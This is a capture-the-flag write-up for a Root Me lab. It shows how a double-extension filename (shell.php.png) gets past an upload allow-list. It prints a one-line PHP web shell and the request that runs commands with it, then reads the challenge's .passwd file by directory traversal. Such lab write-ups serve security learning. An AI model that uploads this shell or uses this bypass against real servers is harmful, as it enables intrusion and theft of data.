# Root Me: File Upload - Double Extensions

**Objective:** Upload a PHP shell to the photo gallery and retrieve the password from `.passwd` at the application root.
**Vulnerability:** File Upload Restriction Bypass (Double Extension).
**Target File:** `.passwd`

---

## 1. Reconnaissance

I began by uploading a legitimate image to understand the application's behavior and file structure.

![[Pasted image 20251127034321.png]]

After uploading, the application stores the image in a randomized directory structure:
`/galerie/upload/[random-hash]/[filename]`

![[Pasted image 20251127034413.png]]

---

## 2. Vulnerability Analysis

I attempted to upload a file named `shell.php` containing a simple web shell.

```php
<?php system($_GET['cmd']); ?>
```

The server rejected the file. The error message suggests that the application implements an allow-list (whitelist) that only accepts image extensions (like `.jpg`, `.png`, `.gif`).

![[Pasted image 20251127034516.png]]

![[Pasted image 20251127034646.png]]

**Hypothesis:** The server likely validates the filename to ensure it _ends_ with a valid image extension. However, due to Apache misconfigurations (handling multiple extensions), it might still execute PHP code if `.php` appears elsewhere in the filename.

## 3. Exploitation

I renamed my payload to include both extensions: **Filename:** `shell.php.png`

### Upload

I uploaded `shell.php.png`. The server accepted it because the filename ends in `.png`.

![[Pasted image 20251127034824.png]]

### Execution

I navigated to the file URL. Because of the "Double Extension" vulnerability, the web server (likely Apache) processed the `.php` extension even though a `.png` extension followed it.

I appended the command payload to the URL to verify execution: `?cmd=id`

```http
GET /web-serveur/ch20/galerie/upload/.../shell.php.png?cmd=id
```

![[Pasted image 20251127034848.png]]

The server returned the user ID, confirming code execution.
## 4. Flag Retrieval

To solve the challenge, I needed to read the `.passwd` file located at the root of the application. Based on the URL structure, I used directory traversal (`../../../`) to move up from the upload folder.

**Payload:** `?cmd=cat ../../../.passwd`

![[Pasted image 20251127040241.png]]

I successfully retrieved the password and validated the challenge.

![[Pasted image 20251127040424.png]]